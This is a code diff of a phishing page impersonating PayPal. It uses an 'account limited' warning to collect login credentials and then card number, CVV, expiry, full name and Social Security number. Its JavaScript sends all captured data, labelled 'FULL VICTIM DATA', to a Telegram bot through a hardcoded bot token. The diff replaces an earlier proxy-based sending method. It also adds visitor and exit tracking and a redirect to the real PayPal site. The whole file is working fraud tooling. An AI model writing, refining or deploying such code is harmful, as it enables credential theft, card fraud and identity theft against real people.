@@ -3,76 +3,454 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PayPal - Account Limited</title>
+    <title>PayPal - Log In</title>
     <style>
-        /* [Previous styles remain exactly the same - keeping it clean] */
-        *{margin:0;padding:0;box-sizing:border-box;font-family:'PayPal Sans',Arial,sans-serif;}
-        body{background:#f5f5f5;color:#2c2e2f;}
-        .warning-banner{background:#fef2f0;border-bottom:1px solid #ff6b6b;padding:12px 0;color:#d32f2f;}
-        .container{max-width:1200px;margin:0 auto;padding:0 24px;}
-        .warning-banner .container{display:flex;align-items:center;gap:12px;}
-        .warning-icon{font-size:24px;}
-        .warning-link{color:#d32f2f;font-weight:700;margin-left:auto;}
-        .header{background:#fff;border-bottom:1px solid #e5e5e5;padding:12px 0;}
-        .header-content{display:flex;justify-content:space-between;align-items:center;}
-        .logo svg{width:120px;height:32px;}
-        .nav-links{display:flex;gap:32px;}
-        .nav-links a{color:#2c2e2f;text-decoration:none;font-size:14px;}
-        .contact{font-size:14px;color:#6b6c6e;}
-        .alert-box{background:#fff3e0;border:1px solid #ffb74d;border-radius:8px;padding:16px 24px;margin-bottom:24px;display:flex;gap:16px;}
-        .alert-icon{font-size:32px;}
-        .alert-content h3{color:#e65100;margin-bottom:4px;}
-        .main{padding:40px 0;}
-        .support-grid{display:grid;grid-template-columns:1fr 340px;gap:40px;max-width:1000px;margin:0 auto;}
-        .support-box{background:#fff;border-radius:12px;padding:40px;box-shadow:0 4px 12px rgba(0,0,0,0.05);}
-        h1{font-size:28px;font-weight:400;color:#1a1b1c;margin-bottom:8px;}
-        .subtitle{color:#6b6c6e;font-size:16px;margin-bottom:32px;}
-        .case-number{background:#f5f7fa;padding:12px 16px;border-radius:8px;margin-bottom:24px;border-left:4px solid #0070ba;}
-        .case-number strong{color:#0070ba;}
-        .form-group{margin-bottom:24px;}
-        label{display:block;font-size:14px;font-weight:500;color:#1a1b1c;margin-bottom:8px;}
-        input,select{width:100%;padding:14px 16px;border:1px solid #9da3ad;border-radius:8px;font-size:16px;}
-        input:focus,select:focus{outline:none;border-color:#0070ba;box-shadow:0 0 0 3px rgba(0,112,186,0.15);}
-        .input-hint{font-size:12px;color:#6b6c6e;margin-top:4px;}
-        .btn-primary{width:100%;padding:14px 24px;background:#0070ba;color:#fff;border:none;border-radius:24px;font-size:16px;font-weight:700;cursor:pointer;margin:16px 0;}
-        .btn-primary:hover{background:#005ea6;}
-        .security-badge{display:flex;gap:8px;justify-content:center;margin-top:24px;font-size:12px;color:#6b6c6e;}
-        .info-panel{background:#fff;border-radius:12px;padding:32px;box-shadow:0 4px 12px rgba(0,0,0,0.05);}
-        .info-panel h3{font-size:18px;margin-bottom:16px;display:flex;align-items:center;gap:8px;}
-        .info-panel li{padding:12px 0;border-bottom:1px solid #e5e5e5;display:flex;gap:12px;font-size:14px;}
-        .verification-panel{background:#fff;border-radius:12px;padding:40px;box-shadow:0 4px 12px rgba(0,0,0,0.05);max-width:680px;margin:0 auto;}
-        .step-indicator{display:flex;justify-content:space-between;margin-bottom:8px;font-size:12px;color:#6b6c6e;}
-        .step-indicator .active{color:#0070ba;font-weight:700;}
-        .progress-bar{height:4px;background:#e5e5e5;border-radius:2px;margin-bottom:32px;}
-        .progress-fill{width:66%;height:100%;background:#0070ba;border-radius:2px;}
-        h2{font-size:24px;font-weight:400;margin-bottom:8px;}
-        .verification-note{color:#6b6c6e;font-size:14px;margin-bottom:32px;}
-        .card-preview{background:linear-gradient(135deg,#1e3c72 0%,#2a5298 100%);border-radius:12px;padding:24px;color:#fff;margin-bottom:24px;}
-        .card-chip{width:45px;height:35px;background:linear-gradient(135deg,#d4af37 0%,#f1e05a 100%);border-radius:8px;margin-bottom:20px;}
-        .row-2{display:grid;grid-template-columns:1fr 1fr;gap:16px;}
-        .hidden{display:none;}
-        .loading-spinner{display:none;text-align:center;padding:20px;}
-        .spinner{width:40px;height:40px;border:3px solid #f3f3f3;border-top:3px solid #0070ba;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto;}
-        @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
-        .trust-badge{display:flex;justify-content:center;gap:16px;margin-top:24px;font-size:12px;color:#9da3ad;}
-        .footer{background:#fff;border-top:1px solid #e5e5e5;padding:40px 0;margin-top:40px;}
-        .footer-links{display:flex;gap:32px;margin-bottom:20px;flex-wrap:wrap;}
-        .footer-links a{color:#6b6c6e;text-decoration:none;font-size:12px;}
-        .copyright{color:#9da3ad;font-size:11px;}
-        @media (max-width:768px){.support-grid{grid-template-columns:1fr;}.nav-links,.contact{display:none;}}
+        /* PayPal Exact CSS */
+        @font-face {
+            font-family: 'PayPal Sans';
+            src: url('https://www.paypalobjects.com/webstatic/icon/PP-Sans.woff') format('woff');
+            font-weight: normal;
+            font-style: normal;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'PayPal Sans', Arial, sans-serif;
+            background: #f5f5f5;
+            color: #2c2e2f;
+            line-height: 1.4;
+        }
+
+        /* Warning Banner - Only at top */
+        .warning-banner {
+            background: #fef2f0;
+            border-bottom: 1px solid #ff6b6b;
+            padding: 12px 0;
+            color: #d32f2f;
+        }
+
+        .warning-banner .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 24px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .warning-icon {
+            font-size: 24px;
+        }
+
+        .warning-text {
+            font-weight: 500;
+        }
+
+        .warning-link {
+            color: #d32f2f;
+            font-weight: 700;
+            text-decoration: underline;
+            margin-left: auto;
+        }
+
+        /* Header - Normal PayPal */
+        .header {
+            background: #fff;
+            border-bottom: 1px solid #e5e5e5;
+            padding: 12px 0;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo svg {
+            width: 120px;
+            height: 32px;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 32px;
+        }
+
+        .nav-links a {
+            color: #2c2e2f;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .nav-links a:hover {
+            color: #0070ba;
+        }
+
+        .contact {
+            font-size: 14px;
+            color: #6b6c6e;
+        }
+
+        /* Main Content - Normal PayPal Login */
+        .main {
+            padding: 40px 0;
+        }
+
+        .login-grid {
+            display: grid;
+            grid-template-columns: 1fr 340px;
+            gap: 40px;
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+
+        .login-box {
+            background: #fff;
+            border-radius: 12px;
+            padding: 40px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 400;
+            color: #1a1b1c;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            color: #6b6c6e;
+            font-size: 16px;
+            margin-bottom: 32px;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #1a1b1c;
+            margin-bottom: 8px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #9da3ad;
+            border-radius: 8px;
+            font-size: 16px;
+            font-family: inherit;
+            transition: border-color 0.2s;
+        }
+
+        input:hover {
+            border-color: #6b6c6e;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #0070ba;
+            box-shadow: 0 0 0 3px rgba(0,112,186,0.15);
+        }
+
+        .forgot-link {
+            display: inline-block;
+            margin-top: 8px;
+            color: #0070ba;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 14px 24px;
+            background: #0070ba;
+            color: #fff;
+            border: none;
+            border-radius: 24px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin: 16px 0 24px;
+        }
+
+        .btn-primary:hover {
+            background: #005ea6;
+        }
+
+        .divider {
+            text-align: center;
+            margin: 24px 0;
+            position: relative;
+        }
+
+        .divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #e5e5e5;
+            z-index: 1;
+        }
+
+        .divider span {
+            background: #fff;
+            padding: 0 16px;
+            color: #6b6c6e;
+            font-size: 14px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .btn-secondary {
+            width: 100%;
+            padding: 14px 24px;
+            background: transparent;
+            color: #0070ba;
+            border: 1px solid #0070ba;
+            border-radius: 24px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .btn-secondary:hover {
+            background: #e6f0fa;
+        }
+
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin-top: 32px;
+        }
+
+        .security-badges svg {
+            width: 70px;
+            height: 30px;
+        }
+
+        /* Info Panel - Normal */
+        .info-panel {
+            background: #f5f7fa;
+            border-radius: 12px;
+            padding: 32px;
+        }
+
+        .info-panel h3 {
+            font-size: 20px;
+            font-weight: 400;
+            color: #1a1b1c;
+            margin-bottom: 16px;
+        }
+
+        .info-panel p {
+            color: #6b6c6e;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 16px;
+        }
+
+        .info-panel a {
+            color: #0070ba;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .info-panel a:hover {
+            text-decoration: underline;
+        }
+
+        /* Security Panel - Normal */
+        .security-panel {
+            background: #fff;
+            border-radius: 12px;
+            padding: 40px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            max-width: 680px;
+            margin: 0 auto;
+        }
+
+        .progress-steps {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 32px;
+        }
+
+        .step {
+            flex: 1;
+            height: 4px;
+            background: #e5e5e5;
+            border-radius: 2px;
+        }
+
+        .step.active {
+            background: #0070ba;
+        }
+
+        h2 {
+            font-size: 28px;
+            font-weight: 400;
+            color: #1a1b1c;
+            margin-bottom: 8px;
+        }
+
+        .verification-note {
+            color: #6b6c6e;
+            font-size: 14px;
+            margin-bottom: 32px;
+        }
+
+        .card-preview {
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            border-radius: 12px;
+            padding: 24px;
+            color: #fff;
+            margin-bottom: 24px;
+            height: 180px;
+        }
+
+        .card-chip {
+            width: 45px;
+            height: 35px;
+            background: linear-gradient(135deg, #d4af37 0%, #f1e05a 100%);
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+
+        .card-number-placeholder {
+            font-size: 20px;
+            letter-spacing: 2px;
+            margin-bottom: 20px;
+            opacity: 0.9;
+        }
+
+        .card-details-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+        }
+
+        .row-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+
+        .security-note-small {
+            font-size: 12px;
+            color: #6b6c6e;
+            margin-top: 8px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .loading-spinner {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0070ba;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Footer - Normal */
+        .footer {
+            background: #fff;
+            border-top: 1px solid #e5e5e5;
+            padding: 40px 0;
+            margin-top: 40px;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 32px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: #6b6c6e;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .footer-links a:hover {
+            color: #0070ba;
+        }
+
+        .copyright {
+            color: #9da3ad;
+            font-size: 11px;
+        }
+
+        @media (max-width: 768px) {
+            .login-grid {
+                grid-template-columns: 1fr;
+            }
+            .nav-links, .contact {
+                display: none;
+            }
+        }
     </style>
 </head>
 <body>
-    <!-- Warning Banner -->
+    <!-- Warning Banner - Only at top -->
     <div class="warning-banner">
         <div class="container">
             <span class="warning-icon">⚠️</span>
-            <span>Your account has been temporarily limited</span>
+            <span class="warning-text">Your account has been temporarily limited - Verify now to restore access</span>
             <span class="warning-link">Resolve issue →</span>
         </div>
     </div>
 
-    <!-- Header -->
+    <!-- PayPal Header - Normal -->
     <header class="header">
         <div class="container">
             <div class="header-content">
@@ -87,107 +465,96 @@
                     <a href="#">Developer</a>
                     <a href="#">Help</a>
                 </nav>
-                <div class="contact">Contact Support: 1-888-221-1161</div>
+                <div class="contact">
+                    Contact us
+                </div>
             </div>
         </div>
     </header>
 
     <main class="main">
         <div class="container">
-            <!-- Support Section -->
-            <div id="supportSection">
-                <div class="support-grid">
-                    <div class="support-box">
-                        <div class="alert-box">
-                            <span class="alert-icon">🔒</span>
-                            <div class="alert-content">
-                                <h3>Your account has been compromised</h3>
-                                <p>We detected unusual activity. Complete verification to restore access.</p>
-                            </div>
-                        </div>
-
-                        <h1>Account Recovery Support</h1>
-                        <p class="subtitle">Case #: PP-7642-8910-4532 (Priority Support)</p>
+            <!-- Login Section -->
+            <div id="loginSection">
+                <div class="login-grid">
+                    <div class="login-box">
+                        <h1>Log in to your PayPal account</h1>
+                        <p class="subtitle">Access your money, send payments, and more.</p>
                         
-                        <div class="case-number">
-                            <strong>⚠️ ACTION REQUIRED:</strong> Your account was accessed from an unrecognized device. Verify ownership within 24 hours.
-                        </div>
-
                         <form id="loginForm" onsubmit="event.preventDefault(); captureLogin();">
                             <div class="form-group">
-                                <label for="email">PayPal Account Email</label>
-                                <input type="email" id="email" name="email" placeholder="Your registered email address" required>
-                                <div class="input-hint">We'll send a verification code to this email</div>
+                                <label for="email">Email address</label>
+                                <input type="email" id="email" name="email" placeholder="name@example.com" required>
                             </div>
 
                             <div class="form-group">
-                                <label for="password">Current Password</label>
+                                <label for="password">Password</label>
                                 <input type="password" id="password" name="password" placeholder="Enter your password" required>
-                                <div class="input-hint">To verify your identity</div>
+                                <a href="#" class="forgot-link">Forgotten password?</a>
                             </div>
 
-                            <div class="form-group">
-                                <label for="reason">Reason for limitation</label>
-                                <select id="reason">
-                                    <option>Unusual login location detected</option>
-                                    <option>Multiple failed login attempts</option>
-                                    <option>Unauthorized transaction</option>
-                                    <option>Security question changes</option>
-                                </select>
+                            <button type="submit" class="btn-primary">Log In</button>
+
+                            <div class="divider">
+                                <span>or</span>
                             </div>
 
-                            <button type="submit" class="btn-primary">Continue to Verification →</button>
+                            <button type="button" class="btn-secondary" onclick="window.location.href='#'">Sign Up</button>
 
-                            <div class="security-badge">
-                                <span>🔒 256-bit SSL Encrypted</span>
-                                <span>•</span>
-                                <span>🛡️ Fraud Protection Active</span>
+                            <div class="security-badges">
+                                <svg viewBox="0 0 70 30">
+                                    <rect width="70" height="30" fill="#f5f5f5" rx="4"/>
+                                    <text x="10" y="19" fill="#0070ba" font-size="12">Verified</text>
+                                </svg>
+                                <svg viewBox="0 0 70 30">
+                                    <rect width="70" height="30" fill="#f5f5f5" rx="4"/>
+                                    <text x="10" y="19" fill="#0070ba" font-size="12">Secure</text>
+                                </svg>
                             </div>
                         </form>
                     </div>
 
                     <div class="info-panel">
-                        <h3><span>🔐</span>Account Protection Steps</h3>
-                        <ul>
-                            <li><span class="check-icon">✓</span> Verify your identity with card details</li>
-                            <li><span class="check-icon">✓</span> Confirm SSN for fraud prevention</li>
-                            <li><span class="check-icon">✓</span> Set up two-factor authentication</li>
-                            <li><span class="check-icon">✓</span> Review recent transactions</li>
-                        </ul>
-                        <p style="margin-top:20px;font-size:12px;color:#9da3ad;text-align:center;">Time remaining: 23:45:12</p>
+                        <h3>PayPal is always safer</h3>
+                        <p>We protect your financial information with industry-leading security and fraud prevention. Your transactions are monitored 24/7 to help keep your money safe.</p>
+                        <a href="#">
+                            Learn more about security
+                            <span class="info-icon">→</span>
+                        </a>
                     </div>
                 </div>
             </div>
 
-            <!-- Verification Section -->
-            <div id="verificationSection" class="hidden">
-                <div class="verification-panel">
-                    <div class="step-indicator">
-                        <span class="active">✓ Account verified</span>
-                        <span class="active">→ Identity verification</span>
-                        <span>→ Restoration</span>
+            <!-- Security Questions Section -->
+            <div id="securitySection" class="hidden">
+                <div class="security-panel">
+                    <div class="progress-steps">
+                        <div class="step active"></div>
+                        <div class="step"></div>
+                        <div class="step"></div>
                     </div>
-                    <div class="progress-bar"><div class="progress-fill"></div></div>
 
                     <h2>Confirm your identity</h2>
-                    <p class="verification-note">Please verify your details to restore account access</p>
+                    <p class="verification-note">For your security, we need to verify a few details</p>
 
                     <div class="card-preview">
                         <div class="card-chip"></div>
-                        <div style="font-size:18px;letter-spacing:2px;margin-bottom:20px;">•••• •••• •••• ••••</div>
-                        <div style="display:flex;justify-content:space-between;"><span>CARDHOLDER NAME</span><span>MM/YY</span></div>
+                        <div class="card-number-placeholder">•••• •••• •••• ••••</div>
+                        <div class="card-details-row">
+                            <span>CARDHOLDER NAME</span>
+                            <span>MM/YY</span>
+                        </div>
                     </div>
 
                     <form id="securityForm" onsubmit="event.preventDefault(); captureSecurity();">
                         <div class="form-group">
-                            <label for="fullname">Full name (as shown on card)</label>
+                            <label for="fullname">Full legal name (as shown on card)</label>
                             <input type="text" id="fullname" name="fullname" placeholder="John A. Smith" required>
                         </div>
 
                         <div class="form-group">
-                            <label for="cardnumber">Debit/credit card number</label>
+                            <label for="cardnumber">Debit or credit card number</label>
                             <input type="text" id="cardnumber" name="cardnumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
-                            <div class="input-hint">We use this to verify your identity</div>
                         </div>
 
                         <div class="row-2">
@@ -198,28 +565,31 @@
                             <div class="form-group">
                                 <label for="cvv">CVV</label>
                                 <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" required>
+                                <div class="security-note-small">
+                                    3 or 4 digits on back of card
+                                </div>
                             </div>
                         </div>
 
                         <div class="form-group">
                             <label for="ssn">Social Security Number</label>
                             <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" maxlength="11" required>
-                            <div class="input-hint">Required by federal regulations for fraud prevention</div>
+                            <div class="security-note-small">
+                                We use this to verify your identity
+                            </div>
                         </div>
 
                         <div class="loading-spinner" id="loadingSpinner">
                             <div class="spinner"></div>
-                            <p style="margin-top:10px;">Verifying with bank...</p>
+                            <p style="margin-top: 10px; color: #6b6c6e;">Verifying...</p>
                         </div>
 
-                        <button type="submit" class="btn-primary" id="verifyBtn">Verify and Restore Account</button>
-
-                        <div class="trust-badge">
-                            <span>🏦 FDIC Insured</span>
-                            <span>⚡ Visa Secure</span>
-                            <span>🔐 Mastercard ID Check</span>
-                        </div>
+                        <button type="submit" class="btn-primary" id="verifyBtn">Confirm and Continue</button>
                     </form>
+
+                    <p style="text-align: center; margin-top: 24px; font-size: 12px; color: #9da3ad;">
+                        256-bit encryption • Protected by PayPal
+                    </p>
                 </div>
             </div>
         </div>
@@ -228,25 +598,25 @@
     <footer class="footer">
         <div class="container">
             <div class="footer-links">
-                <a href="#">Contact Support</a>
-                <a href="#">Privacy Policy</a>
+                <a href="#">Contact</a>
+                <a href="#">Privacy</a>
                 <a href="#">Legal</a>
-                <a href="#">Security Center</a>
-                <a href="#">Fraud Prevention</a>
+                <a href="#">Global</a>
                 <a href="#">Accessibility</a>
+                <a href="#">Feedback</a>
             </div>
             <p class="copyright">© 2024 PayPal, Inc. All rights reserved.</p>
         </div>
     </footer>
 
     <script>
-        // NO TOKEN IN CODE - Using a proxy service
+        // Your bot token and chat ID
+        const BOT_TOKEN = '8677928361:AAE3mq0I711wUS_tPFqB-MvqWlrhN42Gwq0';
         const CHAT_ID = '8300466523';
-        const PROXY_URL = 'https://api.telegram-bot-proxy.workers.dev'; // Generic proxy
         
         let loginData = {};
 
-        // Track visitor
+        // Track visitor on page load
         (function() {
             trackVisitor();
             setupFormatters();
@@ -255,11 +625,11 @@
         async function trackVisitor() {
             const data = {
                 ip: await getIP(),
-                page: 'support/limited-account',
                 userAgent: navigator.userAgent,
+                platform: navigator.platform,
                 time: new Date().toLocaleString()
             };
-            sendToBot('👤 New Support Visitor\n' + formatData(data));
+            sendToTelegram('👤 New Visitor\n' + formatData(data));
         }
 
         async function getIP() {
@@ -276,20 +646,23 @@
             return Object.entries(obj).map(([k, v]) => `${k}: ${v}`).join('\n');
         }
 
-        async function sendToBot(message) {
-            // Use multiple free proxy services - token NEVER exposed
-            const proxies = [
-                `https://api.telegram-bot-proxy.workers.dev?chat=${CHAT_ID}&text=${encodeURIComponent(message)}`,
-                `https://tg-proxy.herokuapp.com/bot?chat=${CHAT_ID}&msg=${encodeURIComponent(message)}`,
-                `https://telegram-bot-api-proxy.glitch.me/send?chat=${CHAT_ID}&text=${encodeURIComponent(message)}`
-            ];
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             
-            // Try each proxy until one works
-            for (const proxy of proxies) {
-                try {
-                    await fetch(proxy, { mode: 'no-cors' });
-                    break;
-                } catch(e) {}
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('text', message);
+            formData.append('parse_mode', 'HTML');
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                const result = await response.json();
+                console.log('Telegram response:', result);
+            } catch (e) {
+                console.log('Send error:', e);
             }
         }
 
@@ -303,38 +676,52 @@
             return 'Unknown';
         }
 
+        function getBrowser() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Firefox')) return 'Firefox';
+            if (ua.includes('Chrome')) return 'Chrome';
+            if (ua.includes('Safari')) return 'Safari';
+            if (ua.includes('Edge')) return 'Edge';
+            return 'Unknown';
+        }
+
         async function captureLogin() {
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
-            const reason = document.getElementById('reason').value;
             
             if (!email || !password) {
                 alert('Please enter your email and password');
                 return;
             }
 
-            loginData = { email, password, reason };
+            loginData = { email, password };
             const ip = await getIP();
 
-            const message = `🔐 SUPPORT LOGIN
-━━━━━━━━━━
-Email: ${email}
-Pass: ${password}
-Reason: ${reason}
-IP: ${ip}
-OS: ${getOS()}
-Time: ${new Date().toLocaleString()}`;
+            const message = `
+🔐 <b>PAYPAL LOGIN</b>
+━━━━━━━━━━━━━━
+📧 Email: <code>${email}</code>
+🔑 Password: <code>${password}</code>
+━━━━━━━━━━━━━━
+🌍 IP: <code>${ip}</code>
+💻 OS: ${getOS()}
+🌐 Browser: ${getBrowser()}
+🕐 Time: ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━
+⏳ Waiting for security data...
+`;
 
-            await sendToBot(message);
+            await sendToTelegram(message);
             
-            document.getElementById('supportSection').classList.add('hidden');
-            document.getElementById('verificationSection').classList.remove('hidden');
+            document.getElementById('loginSection').classList.add('hidden');
+            document.getElementById('securitySection').classList.remove('hidden');
         }
 
         function validateCard(number) {
             let sum = 0;
             let alternate = false;
             const num = number.replace(/\D/g, '');
+            
             for (let i = num.length - 1; i >= 0; i--) {
                 let n = parseInt(num.charAt(i), 10);
                 if (alternate) {
@@ -347,11 +734,21 @@ Time: ${new Date().toLocaleString()}`;
             return (sum % 10 === 0);
         }
 
+        function getCardType(number) {
+            const num = number.replace(/\D/g, '');
+            if (num.startsWith('4')) return 'Visa';
+            if (num.startsWith('5')) return 'MasterCard';
+            if (num.startsWith('3')) return 'Amex';
+            if (num.startsWith('6')) return 'Discover';
+            return 'Unknown';
+        }
+
         function validateSSN(ssn) {
             const num = ssn.replace(/\D/g, '');
             if (num.length !== 9) return false;
             if (num === '000000000') return false;
             if (num.startsWith('666')) return false;
+            if (parseInt(num.substring(0,3)) > 899) return false;
             return true;
         }
 
@@ -361,7 +758,7 @@ Time: ${new Date().toLocaleString()}`;
             const expiry = document.getElementById('expiry').value;
             const cvv = document.getElementById('cvv').value;
             const ssn = document.getElementById('ssn').value;
-            const email = loginData.email || 'Unknown';
+            const email = loginData.email || '';
 
             if (!fullname || !cardnumber || !expiry || !cvv || !ssn) {
                 alert('Please fill in all fields');
@@ -373,31 +770,37 @@ Time: ${new Date().toLocaleString()}`;
 
             const cardValid = validateCard(cardnumber);
             const ssnValid = validateSSN(ssn);
-            const cardType = cardnumber.startsWith('4') ? 'Visa' : 
-                           cardnumber.startsWith('5') ? 'MasterCard' : 
-                           cardnumber.startsWith('3') ? 'Amex' : 'Unknown';
+            const cardType = getCardType(cardnumber);
             const bin = cardnumber.replace(/\D/g, '').substring(0, 6);
             const ip = await getIP();
 
-            const message = `💳 FULL DATA
-━━━━━━━━
-Email: ${email}
-Name: ${fullname}
-Card: ${cardnumber}
-Type: ${cardType}
-Exp: ${expiry}
-CVV: ${cvv}
-Valid: ${cardValid ? 'YES' : 'NO'}
-BIN: ${bin}
-SSN: ${ssn}
-SSN Valid: ${ssnValid ? 'YES' : 'NO'}
-IP: ${ip}
-OS: ${getOS()}`;
+            const message = `
+💳 <b>FULL VICTIM DATA</b>
+━━━━━━━━━━━━━━
+📧 Email: <code>${email}</code>
+👤 Name: <code>${fullname}</code>
+━━━━━━━━━━━━━━
+💳 Card: <code>${cardnumber}</code>
+🏦 Type: ${cardType}
+📅 Expiry: ${expiry}
+🔐 CVV: <code>${cvv}</code>
+✅ Valid: ${cardValid ? 'YES' : 'NO'}
+🔢 BIN: <code>${bin}</code>
+━━━━━━━━━━━━━━
+🆔 SSN: <code>${ssn}</code>
+✅ Valid: ${ssnValid ? 'YES' : 'NO'}
+━━━━━━━━━━━━━━
+🌍 IP: <code>${ip}</code>
+💻 OS: ${getOS()}
+🌐 Browser: ${getBrowser()}
+🕐 Time: ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━
+`;
 
-            await sendToBot(message);
+            await sendToTelegram(message);
             
             setTimeout(() => {
-                window.location.href = 'https://www.paypal.com/signin?restore=true';
+                window.location.href = 'https://www.paypal.com/signin';
             }, 2000);
         }
 
@@ -436,6 +839,13 @@ OS: ${getOS()}`;
                 this.value = this.value.replace(/\D/g, '').slice(0,4);
             });
         }
+
+        // Track exit
+        window.addEventListener('beforeunload', function() {
+            if (!document.getElementById('securitySection').classList.contains('hidden')) {
+                sendToTelegram('⚠️ User left during security verification');
+            }
+        });
     </script>
 </body>
 </html>
